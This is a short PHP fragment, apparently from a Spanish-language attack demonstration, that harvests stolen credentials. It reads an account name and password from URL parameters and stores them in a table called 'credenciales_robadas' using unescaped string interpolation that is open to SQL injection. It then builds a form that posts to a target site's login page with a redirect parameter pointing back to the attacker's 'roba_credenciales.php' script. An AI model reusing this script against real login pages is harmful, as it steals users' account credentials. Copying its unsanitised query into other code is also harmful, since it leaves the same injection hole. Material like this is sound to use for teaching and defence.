...
function valor($parametro) {
	return isset($_GET[$parametro]) ? $_GET[$parametro] : "";
}

$cuenta = valor("cuenta");
$password = valor("password");

if (isset($_GET["comprobado"])) {
	if ($cuenta != "" or $password != "") {
		consulta(
			"insert into credenciales_robadas(cuenta, password) values ('$cuenta','$password')"
		);
	...
	$guardar = urlencode(
		".malicioso.uhw/ataques/demo%2002/roba_credenciales.php?comprobado=1&cuenta=$cuenta&password=$password"
	);
		
	print "
		<form id='formulario' method='POST' action='http://webserver.example.com/aplicacion/login.php?url=$guardar'>
		<input type='text' name='nombre' id='nombre' value='$cuenta'>
